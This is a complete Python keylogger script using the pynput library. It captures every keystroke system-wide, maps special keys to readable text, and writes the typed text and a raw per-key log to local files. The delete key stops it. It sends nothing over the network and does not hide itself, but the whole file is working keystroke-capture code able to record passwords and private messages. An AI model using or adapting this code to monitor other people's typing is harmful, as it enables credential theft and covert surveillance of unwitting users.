from pynput.keyboard import Key, Listener
from datetime import datetime
import logging

shortcuts = ['Key.ctrl', 'Key.cmd', 'Key.cmd_r', 'Key.shift_l', 'Key.shift_r', 'Key.alt_r', 'Key.alt']
buff = ['']

def on_press(key):
    key = str(key).strip("'")
    if key == '<127>':
        listen.stop()
    else:
        with open(file_txt, "a",  buffering=1) as file:
            character = scenario[key] if key in scenario else key
            file.write(character)
            #Add space if last was ctrl
            buff.append(key)
            if (buff[0] == 'Key.shift_l' or buff[0] == 'Key.shift_r') and buff[1] not in shortcuts:
                pass
            elif any(item in shortcuts for item in buff):
                file.write(' ')
            buff.pop(0)

            logging.info(key)
            file.flush()


file_txt = "words"
file_log = "allKeys"
logging.basicConfig(filename=file_log, level=logging.DEBUG, format='')

scenario = {
    'Key.space': ' ',
    'Key.esc': '',
    'Key.enter': '\n',
    'Key.backspace': ' ',
    'Key.shift_l': '',
    'Key.shift_r': '',
    'Key.cmd_r': '',
    'Key.alt_r': '',
    'Key.left': '',
    'Key.down': '',
    'Key.right': '',
    'Key.up': '',
    'Key.shift': '',
    'Key.caps_lock': '',
    'Key.tab': '',
    'Key.media_volume_up': '',
    'Key.media_volume_down': '',
    'Key.media_volume_mute': '',
    'Key.media_play_pause': '',
    'Key.cmd': '',
    'Key.ctrl': '',
    'Key.alt': '',
    '<160>': '',
    '<131>': '',
    '<127>': ''
}


today = datetime.now()
today = today.strftime("%b-%d-%Y-%H:%M")
with open(file_txt, "a") as file:
    file.write("\n\n" + today + "\n")


with Listener(on_press=on_press) as listen:
    try:
        listen.join()
    except KeyboardInterrupt:
        pass
